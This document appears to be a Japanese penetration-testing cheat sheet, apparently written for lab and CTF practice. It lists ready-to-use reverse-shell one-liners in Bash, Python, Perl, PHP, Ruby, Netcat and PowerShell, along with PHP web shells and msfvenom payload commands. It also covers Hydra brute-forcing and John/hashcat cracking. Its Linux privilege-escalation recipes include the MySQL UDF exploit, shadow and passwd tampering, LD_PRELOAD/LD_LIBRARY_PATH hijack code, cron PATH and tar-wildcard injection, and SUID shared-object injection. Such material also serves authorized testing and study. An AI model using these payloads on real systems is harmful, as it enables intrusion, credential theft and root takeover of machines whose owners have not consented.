kali@kali:~$ snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
iso.3.6.1.2.1.25.6.3.1.2.1 = STRING: "LiveUpdate 3.3 (Symantec Corporation)"
iso.3.6.1.2.1.25.6.3.1.2.2 = STRING: "WampServer 2.5"
iso.3.6.1.2.1.25.6.3.1.2.3 = STRING: "VMware Tools"
iso.3.6.1.2.1.25.6.3.1.2.4 = STRING: "Microsoft Visual C++ 2008 Redistributable - x86
9.0.30729.4148"
iso.3.6.1.2.1.25.6.3.1.2.5 = STRING: "Microsoft Visual C++ 2012 Redistributable (x86)
```

## MySQL(3306)
ログイン
```
mysql -u root -p
mysql -u root -p -h <host name> -P <port number>
mysql -u root -e 'SHOW DATABASES;'
```
- -D...データベース名の指定
- -e...コマンドラインから直接SQLコマンドを実行
- -h... ホスト名の指定
- -p...パスワードの指定
- -u...ユーザー名の指定

*データベース一覧の表示
```
mysql > show databases;
```

*データベースの追加
```
mysql > create database sample_db;
```

*テーブル一覧の表示
```
mysql > show tables;
```

*全レコードを選択
```
SELECT * FROM <テーブル名>;
```

*テーブル構造の確認(フィールドを整理して表示してくれるため、下記のユーザ情報取得をすると見やすい)
```
describe <テーブル名>;
```

*ユーザ情報取得
```
SELECT Host, User, Password FROM <テーブル名>;
```

*ユーザの追加
```
create user <追加するusername>@<host name> IDENTIFIED BY <password>;
```

*権限付与
```
grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <password>;
```

## Redis(6379)
[]

# Exploitation
## Reverse Shell
### Bash
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.9",9004))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

### Perl
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
```
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
https://github.com/pentestmonkey/php-reverse-shell.git

```
# Web Shell
<?php echo system($_REQUEST ["cmd"]); ?>
<?php echo(system($_GET["cmd"])); ?>
```

### Ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat
```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### PowerShell
```
C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.
11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T
ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
lient.Close()"
```

## msfvenom
- -p...使用するpayloadの指定
- -f...出力フォーマット
- -a...使用するアーキテクチャ
- -e...エンコーディングの指定(x86/shikata_ga_nai，x64/zutto_dekiru)
- -i...エンコードする回数
- --platform...プラットフォームの選択(windows，Linux)
- -o...ファイルの出力
  
### Windows
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
```

### Linux
```
msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.16.4 LPORT=443 -f python
msfvenom -p linux/x86/shell_reverse_tcp RHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp RHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
```

### PHP
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port Number> -f raw > reverse.php
```

### asp/aspx
```
msfvenom -p windows/shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > reverse.aspx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > reverse.aspx
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > reverse.aspx
```

### JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.jsp
```

### WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f war > reverse.war
```

### Python
```
msfvenom -p cmd/unix/reverse_python LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.py
```

### Bash
```
msfvenom -p cmd/unix/reverse_bash LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.sh
```

### Perl
```
msfvenom -p cmd/unix/reverse_perl LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.pl
```

### Handlers(meterpreter)
```
use exploit/multi/handler
set payload <payload>
set LHOST <ip address>
set LPORT <port number>
run
```

### meterpreterコマンド
[]
```
#meterpreterで使用する有用なコマンドをここに書く
```

## HttpServer
・攻撃者マシンでのサーバ立ち上げ。
```
sudo systemctl start apache2
python -m SimpleHTTPServer 9001
python3 -m http.server 9001
php -S 0.0.0.0:9001
ruby -run -e httpd . -p 9001
busybox httpd -f -p 9001
```

## Netcat
・ファイル転送  
```
送信側
nc <攻撃者のIPアドレス> 9999 < filename

受信側
nc -l -p 9999 > filename
```

## searchsploit
Exploit-dbを即座に検索できるツール。
```
searchsploit <keyword>
```

ターミナル上でコードを閲覧。
```
searchsploit - searchsploit -m windows/remote/39161.py
```

ローカルにコードやテキストをダウンロード。  
これでexploit用スクリプトをダウンロードする。
```
searchsploit -m searchsploit -m windows/remote/39161.py
```

## tcpdump
```
sudo tcpdump -i tun0 icmp
```

## John The Ripper
### zip
```
zip2john a.zip > hash.txt
john hash.txt 
or
john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
```

### ssh
```
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

### md5
```
john --wordlist=/usr/share/wordlist/rockyou.txt --format=Raw-MD5 hash.txt
```

### 同じファイルをクラックした時に出るエラー
```
┌──(kali㉿kali)-[~/htb/boxes/Delivery]
└─$ john --wordlist=/usr/share/wordlist/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
No password hashes left to crack (see FAQ)
```
```
┌──(kali㉿kali)-[~/htb/boxes/Delivery]
└─$ john --show hash                                                                                                
?:PleaseSubscribe!21

1 password hash cracked, 0 left
```

## hashcat
```
hashcat -m 0 -a 0 <パスワードファイル>　/usr/share/wordlist/rockyou.txt
```
- -m 0 = MD5
- -a 0 = 辞書攻撃

Hash type:
https://hashcat.net/wiki/doku.php?id=example_hashes

### hashcat(ルールベース攻撃)
hashcatを利用して、キーワードを元にルールを用いてワードリストを作成することができる。  
ルールは自分で作成することも可能だが、/usr/share/hashcat/rulesを用いることで簡単にワードリストを作成することが可能。
```
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout keyword.txt
```
hashcat:Rule-based Attack  
https://hashcat.net/wiki/doku.php?id=rule_based_attack

## Hydra
- -l...単一のユーザー名の指定
- -L...ユーザーリストファイルの指定
- -p...単一のパスワードの指定
- -P...パスワードファイルの指定
- -s...カスタムポート(sshが22番以外のポートで使用されている時や、https/443を調べる場合に使用)
- -f...ログインとパスワードの組み合わせが少なくとも1つ見つかったら終了
- -V...各試行のログインとパスワードを表示(実行中の試行の様子が確認できる)
- -t...スレッド数の指定

### HTTP Post Form
http-post-formを使用するためには「:」で区切られた3つのパラメータが必要。  
それぞれ「ログインページのpath」「BurpSuiteなどで取得したリクエスト」「エラーメッセージ」が必要となる。  
また、ユーザー名が不要なログインページでも「-l」のパラメータの設定が必要なため、「-l none」など適当に指定しておく。
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 http-post-form "<Login Page>:<Request Body>:<Error Message>"

例)
http:
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -V
https:
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -V -s 443
```

### FTP
```
hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 ftp
```

### SSH
```
hydra -f -l <user> -P /usr/share/wordlists/rockyou.txt 10.10.10.1 -t 4 ssh
```

### MySQL
```
hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 mysql
```

### SMB
```
hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 smb
```

### Wordpress
```
hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```
### Windows RDP
```
hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.1
```

## patator
さまざまなプロトコルに対応したパスワードクラックツール。  
Hydraが成功しない時に、対応するプロトコルモジュールを指定して実行。  
下記はsshの例。
```
patator ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'
```

## Wordlist
```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists
/usr/share/seclists/Discoavery/DNS
```

### Wordlistの作成
#### CeWL
指定されたURLを指定された深さまでスパイダーして単語リストを作成するツール。
```
cewl https://test.com/ -w dict.txt
```
- -w...ファイルに出力
- -d...ディレクトリの深さの指定

#### crunch
自動で全ての組み合わせを出力するツール。  
下記の例では、最小2文字から最大3文字のワードリストを作成する。
```
crunch 2 3 -o dict.txt
```

#### cupp
対話形式で個人をプロファイリングすることで、ワードリストを作成する。  
誕生日、ニックネーム、ペットの名前などを対話形式で答えていく。
```
cupp -i
```

## python2(EOL)
```
# apt
sudo apt install python2
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
python2 get-pip.py
```
```
ls /home/kali/.local/bin | grep pip                                                          1 ⨯
pip
pip2
pip2.7
pipx

pip2 --version
pip 20.3.4 from /home/kali/.local/lib/python2.7/site-packages/pip (python 2.7)
```
```
# pyenv
sudo apt install -y build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.zshrc
echo 'export PATH="$PYENV_ROOT/versions/2.7.18/bin:$PATH"' >> ~/.zshrc
echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init -)"\nfi' >> ~/.zshrc
exec $SHELL
pyenv install 2.7.18
pyenv global 2.7.18
```

## base64,16進数 → テキスト
```
cat test.txt | base64 -d
echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
```
```
cat test.txt | xxd -r -ps
```

## aircrack-ng
```
airmon-ng start wlan0
iwaconfig
airodump-ng wlan0mon
```
```
airodump-ng --channel 対象のチャンネル --bssid APのMACアドレス -w <output filename> wlan0mon
```
```
aircrack-ng <filename>.cap
```

# Privilege Escalation(Linux)
## チェック項目
- tty shell
- linpeas.shの実行(自動列挙)
- ファイル権限の不備(/etc/passwd, /etc/shadow)
- sudoを悪用した権限昇格(sudo -l)
- Cron Jobsの確認(cat /etc/crontab)
- SUIDバイナリを悪用した権限昇格(find / -perm -u=s -type f 2>/dev/null)
- 端末内に残されているpasswordの探索(historyファイル, Webアプリケーションのソースコードやデータベース内の認証情報, .sshディレクトリ内のSSH秘密鍵)
- NFSを介した権限昇格
- 開いているポートの確認(netstat -tulpn)
- 実行中のプロセスの確認(ps -aux，pspyを使用してuid=0<root権限>で定期的に実行されているスクリプトがないか確認)
- Kernel Exploit(uname -a, linux-exploit-suggester-2)

## tty shell
```
#bashが制限されている場合はsh
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/bash";'
perl: exec "/bin/bash";
ruby: exec "/bin/bash"
lua: os.execute('/bin/bash')
```

・Ctrl+c，Ctrl+zなどを利用可能にする

```
stty raw -echo; fg
<Enter><Enter>
```

```
kali@kali:stty -a(結果を下のrows columns に代入)  
victim:stty rows 16 columns 136
```

・clearなどを可能にする
```
export TERM=xterm
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

## Service Exploits(MySQL)
MySQLがrootとして実行されており、rootユーザーにパスワードが割り当てられていない時、以下のエクスプロイトを使用することでroot権限を取得することができる。  
https://www.exploit-db.com/exploits/1518
まずは、raptor_udf2.cエクスプロイトコードをコンパイルする。
```
cd /tmp
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
空白のパスワードを使用してrootユーザーとしてMySQLサービスに接続する。
```
mysql -u root
```
MySQLのシェルで以下のコマンドを実行して、コンパイルされたエクスプロイトを使用してユーザ定義関数(UDF)「do_system」を作成する。
```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
この関数を使用して/bin/bashを/tmp/rootbashにコピーして、SUID権限を設定する。
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
MySQLシェルを終了して下記のコマンドを入力する。
```
/tmp/rootbash -p
```
## Weak File Permissions - Readable /etc/shadow
/etc/shadowファイルにはユーザーパスワードハッシュが記述されている。  
通常はrootユーザーのみが読み取ることができるが、設定ミスなどにより一般ユーザーでも読み取り可能なことがある。  
まずは、読み取り可能かファイルの権限を確認する。
```
ls -l /etc/shadow

-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```
読み取り可能である場合、ファイルの中身を閲覧してrootのハッシュをコピーしてテキストファイルに保存する.

```
cat /etc/shadow

root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::


cat hash.txt

root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
```
得られたrootパスワードのハッシュをjohnでパスワードクラックする。
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Weak File Permissions - Writable /etc/shadow
設定ミスなどにより、/etc/shadowファイルが書き込み可能である場合、rootのパスワードハッシュを自身で作成したものに置き換えて権限昇格することが可能である。
```
ls -l /etc/shadow

-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```
```
mkpasswd -m sha-512 <パスワードにしたい好きな文字列>

$6$xmmQPckNVPWL/VVF$wMS2EIY2jmISe6X2mcuBWo9aWLRg9/TaDhOLK/ZjS1197OSL7LugJIf4JXIhLLDR8xd1kbnKWYITJglhMFwQs1
```
その後、/etc/shadowのパスワードハッシュを上記のハッシュに書き換えて、rootユーザーに切り替える。

## Weak File Permissions - Writable /etc/passwd
/etc/passwdファイルには、ユーザーアカウントに関する情報が含まれている。これは誰でも読み取り可能になっているが、書き込みは通常rootユーザのみとなる。  
しかし設定ミスなどにより、/etc/passwdファイルが書き込み可能である場合、rootのパスワードハッシュを自身で作成したものに置き換えて権限昇格することが可能である。
```
ls -l /etc/passwd

-rw-r--rw- 1 bbbbroot root 1025 Feb  8 00:58 /etc/passwd
```
```
openssl passwd <パスワードにしたい好きな文字列>
```
/etc/passwdファイルを編集して、生成されたパスワードハッシュに置き換えてrootユーザーに切り替える。  

または、rootユーザーの行をコピーして、ファイルの最後に追加して、新たなrootユーザーとパスワードを設定することも可能である。

## Sudo - Shell Escape Sequences
sudo権限で実行できるプログラムの一覧を表示する。
```
sudo -l
```
GTFOBins(https://gtfobins.github.io)にアクセスして、表示されたプログラムを利用することで権限昇格できるかを試みる。

## Sudo - Environment Variables
sudoはユーザーの環境から特定の環境変数を継承するように構成できる。  
まずは、継承されている環境変数を確認する(env_keepオプションを探す)。
```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
```
LD_PRELOADとLD_LIBRARY_PATHは、どちらもユーザーの環境から継承される。  
LD_PRELOADは、プログラムの実行時に他のどのオブジェクトよりも先に共有オブジェクトをロードする。  
LD_LIBRARY_PATHは、共有ライブラリが最初に検索されるディレクトリのリストを提供します。  

下記のコードを使用して共有オブジェクトを作成する。
```
preload.c:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
```
LD_PRELOAD環境変数を新しい共有オブジェクトのフルパスに設定しながら、sudo(sudo -lの実行時にリストされる)を介して実行が許可されているプログラムを実行します。
```
sudo LD_PRELOAD=/tmp/preload.so <sudo -lでリストされたプログラム>
```
これにより、rootシェルを取得できる。  
これを利用できるパターンとして、GTFOBinsには記載されていないプログラムがsudo -lにリストしている場合である。  
例えば、apache2の場合はGTFOBinsには記載されていない。  
まずは、apache2プログラムファイルに対してlddコマンドを実行して、プログラムで使用されている共有ライブラリを確認する。
```
ldd /usr/sbin/apache2
      linux-vdso.so.1 =>  (0x00007fff3c8e7000)
      libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fd2f55c2000)
      libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007fd2f539e000)
      libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007fd2f5164000)
      libpthread.so.0 => /lib/libpthread.so.0 (0x00007fd2f4f48000)
      libc.so.6 => /lib/libc.so.6 (0x00007fd2f4bdc000)
      libuuid.so.1 => /lib/libuuid.so.1 (0x00007fd2f49d7000)
      librt.so.1 => /lib/librt.so.1 (0x00007fd2f47cf000)
      libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007fd2f4598000)
      libdl.so.2 => /lib/libdl.so.2 (0x00007fd2f4393000)
      libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007fd2f416b000)
      /lib64/ld-linux-x86-64.so.2 (0x00007fd2f5a7f000)
```
下記のコードを使用して、リストされているライブラリの1つ(ここではlibcrypt.so.1を選択)と同じ名前の共有オブジェクトを作成する。
```
library_path.c:

#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/library_path.c
```
最後に、LD_LIBRARY_PATH環境変数を/tmp(コンパイルされた共有オブジェクトを出力する場所)に設定しながら、sudoを使用してapache2を実行する。
```
sudo LD_LIBRARY_PATH=/tmp apache2
```
これにより、GTFOBinsに記載がないプログラムでもsudo -lによってリストされていた場合にrootシェルを取得することができる。

## Cron Jobs - File Permissions
cronジョブはユーザーが特定の時間または間隔で実行するようにスケジュールできるプログラムである。  
cronテーブルファイル(crontabs)は、cronジョブの構成が記載されており、システム全体のcrontabは/etc/crontabにある。
```
cat /etc/crontab
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
上記のコマンドにより、スケジュールされたrootで実行されているcronジョブが存在し、現在のユーザー権限で書き込み可能なファイルがある場合、reverse shellペイロードを書き込むことでrootシェルを取得できる。

## Cron Jobs - PATH Environment Variable
crontabのPATH変数が、下記のoverwrite.shのように明示されていない場合、PATH変数に示されているパスに同じ名前のreverse shellファイルなどを配置することで、rootシェルを取得できる。
```
user@debian:~/tools/sudo$ cat /etc/crontab

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```
例えば、上記の結果の場合は/home/userディレクトリにreverse shellペイロードを記述したoverwrite.shを配置することでrootシェルを取得できる。

## Cron Jobs - Wildcards
/etc/crontabを確認した結果、下記のスクリプトがスケジュールさていてた場合
```
user@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
tarコマンドが/home/userディレクトリのファイルをバックアップするために、ワイルドカード(*)を使用して実行されていることに着目する。  
tarについてGTFOBinsを確認すると、tarにはチェックポイント機能の一部として他のコマンドを実行できるコマンドラインオプションがあることを分かる。  
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```
上記のバイナリをターゲット端末に転送して、ファイル権限を実行可能にしておく。
```
chmod +x /home/user/shell.elf
```
そして、ワイルドカード(*)で指定されているディレクトリに「--checkpoint=1」「--checkpoint-action=exec=shell.elf」を作成する。  
cronジョブのtarコマンドが実行されると、ワイルドカード(*)によりこれらのファイルが含まれる。これらのファイル名は有効なtarコマンドラインのオプションであるため、tarはファイル名をコマンドオプションとして認識して、ファイル名ではなくコマンドラインオプションとして扱ってしまう。  
これにより、shell.elfが実行されてrootシェルを取得することができる。

## Cron Jobs - Systemd Timers
/etc/systemd/system/配下にファイルを配置されているファイルをチェック(見たことがないファイルが置かれていないか)
- .service(定期実行するファイルのパスなどを記述)
- .timer(時間間隔の指定)
```
systemctl list-timers --all
```
```
find / -name *timer -type f 2>>/dev/null
```

```
# Systemd Timerの有効化
sudo systemctl start datetest.service
# Systemd Timerの起動
sudo systemctl start datetest.timer
```
## SUID/SGID Executables - Known Exploits
SUIDはSet User IDを表し、ユーザーはファイル所有者としてファイルを実行できる。   
これを利用して、LinuxではSUIDビットが有効になってファイル所有者がrootになっている場合、既存のバイナリとコマンドの一部をroot以外のユーザーが使用して、rootアクセス権限を昇格させることができる。  
下記のコマンドを実行するとSUIDアクセス許可を物全てのバイナリを列挙することができる。
```
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
- /は、ファイルシステムの先頭（ルート）から開始し、すべてのディレクトリを検索
- -permは、後続の権限の検索
- -u=sは、rootユーザーが所有するファイルを検索
- -typeは、探しているファイルの種類を示します
- fは、ディレクトリや特殊ファイルではなく、通常のファイルを示す
- 2はプロセスの2番目のファイル記述子であるstderr（標準エラー）を示す
- &gt;はリダイレクトを意味する
- /dev/nullは、書き込まれたすべてのものを破棄する特別なファイルシステムオブジェクト
```
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwsr-sr-x 1 root root 926536 Feb  8 02:25 /tmp/rootbash
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```
コマンドを実行した上記の結果より、exim-4.84-3を列挙できる。  
このソフトウェアには既知のエクスプロイトが存在する(CVE-2016-1531)。  
これらを利用してエクスプロイトすることで権限昇格できる可能性がある。

### これまでにHackTheBoxなどで発見した権限昇格に利用できるSUIDバイナリ
```
exim-4.84-3
nfsen-1.3.7
screen-4.5.0
keybase-redirector
```

## SUID/SGID Executables - Shared Object Injection
SUID実行可能ファイル(今回はsuid-soという名前の実行可能ファイル)が共有オブジェクトインジェクションに対して脆弱な場合、権限昇格できる可能性がある。  
ファイルに対して、straceを実行して"open|access|no such file"を検索する。

```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```
実行可能ファイルはホームディレクトリ内の/home/user/.config/libcalc.so共有オブジェクトを読み込もうとしているが、見つかっていないことを確認する。  
これを利用するために、libcalc.soファイルの.configディレクトリを作成する。  
```
mkdir /home/user/.config
```
下記のコードを利用して、suid-so実行可能ファイルが探してた場所にある共有オブジェクトにコードをコンパイルする。  
コード内容としては単にbashシェルを生成するものである。
```
libcalc.c:

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
```
gcc -shared -fPIC -o /home/user/.config/libcalc.so /tmp/libcalc.c
```
suid-so実行可能ファイルを再度実行すると、rootシェルを取得できる。
```
/usr/local/bin/suid-so
```

## SUID/SGID Executables - Environment Variables
sudo・root権限で実行可能なスクリプト内(SUIDバイナリ)にserviceやcurl、gzip、psコマンドなどがフルパスなしで記述され実行されている場合、自分が用意したコマンド(/bin/shやreverse shellスクリプト)などを実行させるようにパスを書き換える。  
今回、利用するバイナリは/usr/local/bin/suid-envとする。
```
strings /usr/local/bin/suid-env

/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
system
__libc_start_main
GLIBC_2.2.5
l$ L
t$(L
|$0H
service apache2 start
```
今回の場合、apache2を起動するためのserviceコマンドが絶対パスでないため、読み込むバイナリを置き換えてやることができる。
```
# Get a shell
echo $PATH
cd /tmp
echo /bin/sh > service
chmod 777 service
export PATH=/tmp:$PATH or PATH=/tmp:$PATH /usr/local/bin/suid-env
```
別のパターンとして、SUIDバイナリにgzipが使用されていた場合にreverse shellを取得する際について記載する。
```
# reverse shell
echo $PATH
cd /tmp

# gzipの部分はインジェクションさせたいコマンド
echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" > gzip
chmod 777 gzip
export PATH=/tmp:$PATH

# root権限で動かせるスクリプトなどを実行(前提としてスクリプト内で上記のgzipなどが記述されている)
./backup.sh
whoami → root
```

## SUID/SGID Executables - Abusing Shell Features (#1)
sudo・root権限で実行可能なスクリプト内(SUIDバイナリ)に絶対パスを使用してコマンドを実行していても、Bashのバージョン(<4.2-048)によって権限昇格できる可能性がある。  
今回、利用するバイナリは/usr/local/bin/suid-env2とする。
```
strings /usr/local/bin/suid-env2

/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
system
__libc_start_main
GLIBC_2.2.5
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```
